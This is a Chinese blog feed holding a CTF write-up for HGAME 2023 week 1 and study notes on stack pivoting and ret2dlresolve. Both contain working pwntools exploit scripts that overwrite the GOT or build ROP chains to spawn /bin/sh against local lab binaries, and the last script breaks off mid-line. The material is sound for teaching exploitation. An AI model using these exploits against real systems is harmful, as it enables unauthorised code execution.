<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Vidar Hgame 2023 Week1</title>
      <link href="/2023/03/08/hgame-vidar-2023-week1/"/>
      <url>/2023/03/08/hgame-vidar-2023-week1/</url>
      
        <content type="html"><![CDATA[<p>当时比赛签了个到就没玩儿了,所以这里新开一篇来复现这次比赛的所有类型,这一篇是记录week1的题型,主要是专精pwn方面的,其他的多多少少都会一点;如果不出意外的话我应该会完整地复现week1-week4的内容,部分其他方向过于困难的题型我也会选择忽略,毕竟不是全栈大佬嘛</p><blockquote><p>09日注:发现这个比赛复现难度太难了,主要是官方之给了一部分web的复现素材,其余的方向复现素材反正我没有找到:( 后面就不更新了,直接去找wargame玩了</p></blockquote><h1 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h1><h2 id="classic-childhood-game"><a class="markdownIt-Anchor" href="#classic-childhood-game"></a> Classic Childhood Game</h2><p>一个经典的魔塔游戏,这游戏以前挺火;可是我的童年是4399和FC游戏机.</p><p>wp给出了三种解法:</p><ul><li>直接控制台运行<code>mota()</code>函数</li><li>断点调试,可以注意到对话时会触发<code>Switch(ID)</code>函数,修改ID为任意对应结局ID即可</li><li>从localStorage修改存档</li></ul><p>这里的第二个方法我用的是firefox不能在调试时修改变量,所以就直接在控制台输入<code>$&#123;var&#125; = value</code>来解决这个问题;第三个方法我这里存档存不了,我对源码进行了全局搜索并没有发现有相关<code>SaveGame()</code>的函数</p><h2 id="guess-who-i-am"><a class="markdownIt-Anchor" href="#guess-who-i-am"></a> Guess who I am</h2><p>这道题复现需要用到Docker,直接在<code>Dcokerfile</code>文件目录运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker build -t web/whoami .</span><br><span class="line">docker run -d -p 8080:8080 web/whoami</span><br></pre></td></tr></table></figure><p>然后访问<code>localhost:8080</code>就可以正常进入主页<br /><img src="/pictures/vh2023/web/guesswhoami.png" alt="home" /></p><p>很明显这是个猜数字的游戏,如果猜错了就会alert弹窗<code>Wrong,Try again</code></p><p>写了半小时脚本发现在他们主页上面的member数据直接get请求是请求不到的,可能是ajax动态绑定的内容?然后我去搜别人的wp发现人家member.json是直接在hint里面给了你</p><p>两种方式:</p><ul><li>直接一个一个ID输进去,输入完就可以拿到flag</li><li>写脚本,自动对比输入</li></ul><p>下面贴上脚本</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://localhost:8080&quot;</span></span><br><span class="line">mem_url=<span class="string">&quot;https://vidar.club/member&quot;</span></span><br><span class="line">json_data=<span class="string">&quot;&quot;</span></span><br><span class="line">cookies=&#123;</span><br><span class="line">        <span class="string">&quot;session&quot;</span>:<span class="string">&quot;MTY3ODI2MTY1MXxEdi1CQkFFQ180SUFBUkFCRUFBQVBQLUNBQUlHYzNSeWFXNW5EQTBBQzJOb1lXeHNaVzVuWlVsa0EybHVkQVFEQVAtQUJuTjBjbWx1Wnd3SUFBWnpiMngyWldRRGFXNTBCQUlBQmc9PXx_2YnMFm_SvPM5CYwDuQ9TZnzhxCb7LP2wLzX7Cah38g====-NX-JRRIW6qPC8nu0xIvMOWvijINXGkJxJQOzS7zodQ==&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getJsonFile</span>():</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;member.json&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                <span class="keyword">global</span> json_data</span><br><span class="line">                json_data=json.load(f)</span><br><span class="line">        <span class="comment">#print(json_data)</span></span><br><span class="line">        </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">matchID</span>():</span><br><span class="line">        session = requests.session()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">                ques = session.get(url=url+<span class="string">&quot;/api/getQuestion&quot;</span>,cookies=cookies)</span><br><span class="line">                message = json.loads(ques.text)[<span class="string">&#x27;message&#x27;</span>]</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[+]Question Intro: &quot;</span>+message)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> json_data:</span><br><span class="line">                        <span class="keyword">if</span> message == i[<span class="string">&#x27;intro&#x27;</span>]:</span><br><span class="line">                                submit_id = &#123;</span><br><span class="line">                                        <span class="string">&quot;id&quot;</span>:i[<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line">                                &#125;</span><br><span class="line">                </span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[*]Verify Answer: &quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                verify = session.post(url=url+<span class="string">&quot;/api/verifyAnswer&quot;</span>,cookies=cookies,data=submit_id).text</span><br><span class="line">                verify = json.loads(verify)</span><br><span class="line">                <span class="built_in">print</span>(submit_id)</span><br><span class="line">                <span class="built_in">print</span>(verify)</span><br><span class="line">                <span class="keyword">if</span> verify[<span class="string">&#x27;message&#x27;</span>] == <span class="string">&quot;Correct answer!&quot;</span>:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;Verified!&quot;</span>)</span><br><span class="line">                        score = session.get(url+<span class="string">&quot;/api/getScore&quot;</span>,cookies=cookies).text</span><br><span class="line">                        score = json.loads(score)[<span class="string">&#x27;message&#x27;</span>]</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;==========&quot;</span>,<span class="string">&quot;Current Score:&quot;</span>,score,<span class="string">&quot;==========&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">        getJsonFile()</span><br><span class="line">        matchID()</span><br></pre></td></tr></table></figure><h2 id="become-a-member"><a class="markdownIt-Anchor" href="#become-a-member"></a> Become A Member</h2><p>常规的请求数据构造</p><p>需要构造的有如下:</p><ul><li>User-Agent</li><li>Cookie</li><li>Referer</li><li>XFF</li></ul><h2 id="show-me-your-beauty"><a class="markdownIt-Anchor" href="#show-me-your-beauty"></a> Show Me Your Beauty</h2><p>这两道题都没有给出源码,所以无法复现,内容是简单程度的php一句话木马</p><h1 id="reverse"><a class="markdownIt-Anchor" href="#reverse"></a> Reverse</h1><h2 id="test_your_idea"><a class="markdownIt-Anchor" href="#test_your_idea"></a> test_your_idea</h2><p>这里直接对文件进行反编译就可以看到<code>flag</code>内容,我比较常用的就是Ghidra</p><h2 id="last"><a class="markdownIt-Anchor" href="#last"></a> Last</h2><p>下面就不写了吧,基本上都是需要对具体汇编代码进行分析,由于是复现所以记录下来收益肯定不大,也没有可以提供我们进行复现的材料,所以直接跳过</p><h1 id="pwn"><a class="markdownIt-Anchor" href="#pwn"></a> PWN</h1><h2 id="test_nc"><a class="markdownIt-Anchor" href="#test_nc"></a> test_nc</h2><p>只需要会<code>nc</code>指令连接到远端就行了</p><h2 id="easy_overflow"><a class="markdownIt-Anchor" href="#easy_overflow"></a> easy_overflow</h2><p>这道题我们可以发现main函数里面buf只有16字节的占用大小,但是我们可以输入0x100字节大小的内容,很明显存在栈溢出;并且可以发现有一个名字叫<code>b4ckd0or</code>的函数后门,那么我们的目标就很明确了</p><p>直接构建</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x18的垃圾地址对返回地址进行覆盖,ret对栈空间进行平衡,最后调用后门函数</span><br></pre></td></tr></table></figure><h2 id="choose_the_seat"><a class="markdownIt-Anchor" href="#choose_the_seat"></a> choose_the_seat</h2><p>这道题同样只开启了NX</p><p>可以看到在我们输入座位号的时候没有进行越界检查,所以我们可以通过反向越界从<code>bss</code>表跳转到<code>GOT</code>表来进行覆写</p><p>修改<code>exit</code>为存在漏洞的函数地址这样我们就可以进行漏洞复用</p><p>最后泄漏基址,修改<code>puts</code>为<code>system</code>,输入<code>/bin/sh\x00</code>来执行LCE漏洞</p><p><a href="http://xn--solve-4h1hu32fyqsqr8agm7d.py">附上官方的solve.py</a></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;konsole&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line"><span class="comment"># p = process(&quot;./vuln&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">9999</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./vuln&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;one.&quot;</span>, <span class="string">b&quot;-6&quot;</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;name&quot;</span>, p64(elf.sym[<span class="string">&quot;vuln&quot;</span>]))</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;one.&quot;</span>, <span class="string">b&quot;-8&quot;</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;name&quot;</span>, <span class="string">b&quot;a&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;is &quot;</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">0x08</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x8ba61</span></span><br><span class="line">success(<span class="string">&quot;libc_base = &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;one.&quot;</span>, <span class="string">b&quot;-9&quot;</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;name&quot;</span>, <span class="string">b&quot;/bin/sh\x00&quot;</span> + p64(libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> MIX </category>
          
      </categories>
      
      
        <tags>
            
            <tag> game </tag>
            
            <tag> personal </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>note stack-pivoting&amp;ret2dlresolve</title>
      <link href="/2023/02/27/pwn-stackpivot/"/>
      <url>/2023/02/27/pwn-stackpivot/</url>
      
        <content type="html"><![CDATA[<h1 id="stackpivoting"><a class="markdownIt-Anchor" href="#stackpivoting"></a> StackPivoting</h1><p>偶然发现github上面有一个概念+实验漏洞说明一个很好的项目 <a href="https://github.com/ir0nstone/pwn-notes/tree/master/types/stack/stack-pivoting">stack-pivot</a>,作者名字叫ir0nstone,发现是个佬果断学习一下.</p><p>由于不是结束实验再进行的笔记记录,只是粗略的看了一眼感觉还可以;接下来直接进行概念说明</p><h2 id="概念说明"><a class="markdownIt-Anchor" href="#概念说明"></a> 概念说明</h2><p>一款针对栈空间不足时进行攻破的技术,为了更好的理解需要先了解什么是栈帧;函数的每次调用都需要调用栈帧</p><p><img src="/pictures/StackFrame_new.png" alt="stack_frame_new" /><br />图中的esp寄存器别称(Stack Pointer);ebp寄存器别称(Frame Pointer).</p><p>为了使用stack pivoting我们需要主要使用以下三种方式进行:</p><ul><li>pop rsp</li><li>xchg &lt;reg&gt;; pop;<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pop &lt;reg&gt;</span><br><span class="line">&lt;reg value&gt;</span><br><span class="line">xchg &lt;reg&gt;,rsp</span><br></pre></td></tr></table></figure></li><li>leave ; ret;</li></ul><blockquote><p>pop rsp是最简单的;还有一个比较特殊的就是xchg &lt;reg&gt;,可以说是一种间接的形式(需要16bytes),另外一种是leave;ret;并且只需要8bytes就可以完成stack pivoting,除了main函数是以ret结束,其余的函数调用都是以leave;ret;来结束调用的.</p></blockquote><p>针对上诉的第三个方法做一个补充,leave相当于mov rbp,rsp;poprbp;并且ret相当于pop rip;恢复指令执行指针寄存器</p><h2 id="实现通过pop-rsp"><a class="markdownIt-Anchor" href="#实现通过pop-rsp"></a> 实现(通过pop rsp)</h2><p>这是最简单的可以达成stack pivoting的方式,如果程序中刚好有这一段那么我们就可以非常容易的实现这一过程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc source.c -o vuln -no-pie -static</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">winner</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(a == <span class="number">0xdeadbeef</span> &amp;&amp; b == <span class="number">0xdeadc0de</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Great job!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Whelp, almost...?&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">0x60</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Try pivoting to: %p\n&quot;</span>, buffer);</span><br><span class="line">    fgets(buffer, <span class="number">0x80</span>, <span class="built_in">stdin</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是一段演示如何利用stack pivoting的程序,很明显我们需要以调用指定函数并且赋予参数指定的数值;虽然我们有<code>0x20</code>的可溢出空间大小,但是很明显我们仅凭这一点字符容量不能够构成对应功能的ROP链;同时为了更好地将注意力集中在主要内容上,溢出了buffer的地址</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">target=process(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(target,gdbscript=&quot;b *0x040179d&quot;)</span></span><br><span class="line"></span><br><span class="line">target.recvuntil(<span class="string">b&#x27;to: &#x27;</span>)</span><br><span class="line">buffer = <span class="built_in">int</span>(target.recvuntil(<span class="string">&#x27;\n&#x27;</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(buffer)</span><br><span class="line">log.success(<span class="string">f&#x27;Buffer: <span class="subst">&#123;<span class="built_in">hex</span>(buffer)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x401c7d</span></span><br><span class="line">pop_rsi=<span class="number">0x40a4cd</span></span><br><span class="line">pop_rsp=<span class="number">0x4020e8</span></span><br><span class="line"></span><br><span class="line">winner_addr=ELF(<span class="string">&#x27;./vuln&#x27;</span>).sym[<span class="string">&#x27;winner&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"><span class="comment"># set params</span></span><br><span class="line">payload=flat(pop_rdi,<span class="number">0xdeadbeef</span>,pop_rsi,<span class="number">0xdeadc0de</span>,winner_addr)</span><br><span class="line">payload=payload.ljust(<span class="number">104</span>,<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line"><span class="comment"># stack-pivot</span></span><br><span class="line">payload+=flat(pop_rsp,buffer)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">target.sendline(payload)</span><br><span class="line"><span class="built_in">print</span>(target.recvline())</span><br></pre></td></tr></table></figure><p>成功输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[*] Paused (press any to continue)</span><br><span class="line">b&#x27;Great job!\n&#x27;</span><br><span class="line">[*] Stopped process &#x27;./vuln&#x27; (pid 77606)</span><br></pre></td></tr></table></figure><h2 id="实现通过leave-ret"><a class="markdownIt-Anchor" href="#实现通过leave-ret"></a> 实现(通过leave ret)</h2><p>当我们调用<code>leave ret</code>的时候,实际上的效果和一下相同</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pop rsp,rbp</span><br><span class="line">pop rbp</span><br></pre></td></tr></table></figure><p>我们可以通过控制rbp来控制rsp来进行stack pivoting,先上exp</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">target=process(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"></span><br><span class="line">target.recvuntil(<span class="string">&#x27;to: &#x27;</span>)</span><br><span class="line">buffer=<span class="built_in">int</span>(target.recvuntil(<span class="string">b&#x27;\n&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">f&#x27;Buffer: <span class="subst">&#123;<span class="built_in">hex</span>(buffer)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">leave_ret=<span class="number">0x401765</span></span><br><span class="line">pop_rdi=<span class="number">0x401c7d</span></span><br><span class="line">pop_rsi=<span class="number">0x40a4cd</span></span><br><span class="line">winner_addr=elf.sym[<span class="string">&#x27;winner&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=flat(<span class="number">0</span>,pop_rdi,<span class="number">0xdeadbeef</span>,pop_rsi,<span class="number">0xdeadc0de</span>,winner_addr)</span><br><span class="line">payload=payload.ljust(<span class="number">0x60</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload+=flat(buffer,leave_ret)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">target.sendline(payload)</span><br><span class="line"><span class="built_in">print</span>(target.recvline())</span><br></pre></td></tr></table></figure><p>这里的第一个flat需要填入0是因为pop rbp这个指令就算对我们没用也是需要赋值以完成栈平衡的,不然就会报错,第二个垃圾数据选择的填充<code>0x60</code>个是因为我们需要把buffer填充进rbp然后利用mov rsp,rbp来间接控制rsp指针</p><h2 id="xchg-reg"><a class="markdownIt-Anchor" href="#xchg-reg"></a> xchg <reg></h2><p>这个指令跟上面方法差不多,只需要找到与之相搭配的pop gadget我们就可以间接控制rsp,xchg &lt;reg&gt;,rsp的效果是寄存器和rsp交换数值</p><h1 id="ret2dlresolve"><a class="markdownIt-Anchor" href="#ret2dlresolve"></a> ret2dlresolve</h1><h2 id="资源下载"><a class="markdownIt-Anchor" href="#资源下载"></a> 资源下载</h2><ul><li><a href="/cyber/pwn/ret2dlresolve_bof_no">bin with no_relro</a></li><li><a href="/cyber/pwn/ret2dlresolve_bof">bin with partial_relro</a></li></ul><h2 id="no-relro-exp"><a class="markdownIt-Anchor" href="#no-relro-exp"></a> No-Relro EXP</h2><h3 id="exp"><a class="markdownIt-Anchor" href="#exp"></a> exp</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./bof_no&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./bof_no&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">offset = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x70</span></span><br><span class="line">bss = elf.bss()</span><br><span class="line">read_plt=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># .dynstr and .dynsym address in .dynamic</span></span><br><span class="line">dynamic_s = elf.get_section_by_name(<span class="string">&#x27;.dynamic&#x27;</span>).header[<span class="string">&#x27;sh_addr&#x27;</span>]</span><br><span class="line">dynstr_s = dynamic_s+<span class="number">0x4</span>*<span class="number">17</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># make fake .dynsym section</span></span><br><span class="line">dynstr=elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).data()</span><br><span class="line">dynstr=dynstr.replace(<span class="string">b&#x27;read&#x27;</span>,<span class="string">b&#x27;system&#x27;</span>)</span><br><span class="line">fake_dynstr_s=bss+<span class="number">0x200</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Rop chain</span></span><br><span class="line">rop=ROP(<span class="string">&#x27;./bof_no&#x27;</span>)</span><br><span class="line">rop.raw(offset)</span><br><span class="line">rop.read(<span class="number">0</span>,dynstr_s,<span class="number">4</span>)</span><br><span class="line">rop.read(<span class="number">0</span>,fake_dynstr_s,<span class="built_in">len</span>(dynstr))</span><br><span class="line">rop.read(<span class="number">0</span>,fake_dynstr_s+<span class="number">0x100</span>,<span class="built_in">len</span>(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># fake read(system call)</span></span><br><span class="line">rop.raw(read_plt+<span class="number">0x4</span>)</span><br><span class="line">rop.raw(<span class="number">0xdeadbeef</span>)</span><br><span class="line">rop.raw(fake_dynstr_s+<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rop.dump())</span><br><span class="line"></span><br><span class="line">p.send(rop.chain())</span><br><span class="line">p.send(p32(fake_dynstr_s))</span><br><span class="line">p.send(dynstr)</span><br><span class="line">p.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># modify .dynsym offset in .dynamic segment</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这一部分最简单就不解释了，我们可以直接改变.dynmic字段中的.dynstr地址指向为我们构造的地址，然后手动调用read@plt的第二个汇编语句，参数我们就填写<code>/bin/sh\x00</code></p><h2 id="partial-relro-exp"><a class="markdownIt-Anchor" href="#partial-relro-exp"></a> Partial-Relro EXP</h2><p>这个算是栈空间技术篇章中比较高级的一个漏洞利用类别了；所以我依然会和我所参考的内容一样将其分为stage1~stage6分级进行hack，这样就可以更清晰地帮助理解每一步究竟是干什么的</p><h3 id="stage1"><a class="markdownIt-Anchor" href="#stage1"></a> stage1</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./bof&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./bof&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset=<span class="number">108</span></span><br><span class="line">bss_addr=elf.bss()</span><br><span class="line">stack_size=<span class="number">0x800</span></span><br><span class="line">bss_addr+=stack_size</span><br><span class="line"></span><br><span class="line"><span class="comment"># gadgets we want to use</span></span><br><span class="line">leave_ret=<span class="number">0x08049116</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line"><span class="comment"># stack-pivot</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*offset</span><br><span class="line">payload+=p32(bss_addr)</span><br><span class="line">payload+=p32(elf.plt[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload+=p32(leave_ret)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(bss_addr)</span><br><span class="line">payload+=p32(<span class="number">100</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload=p32(bss_addr+<span class="number">0x800</span>)</span><br><span class="line">payload+=p32(elf.plt[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line">payload+=p32(<span 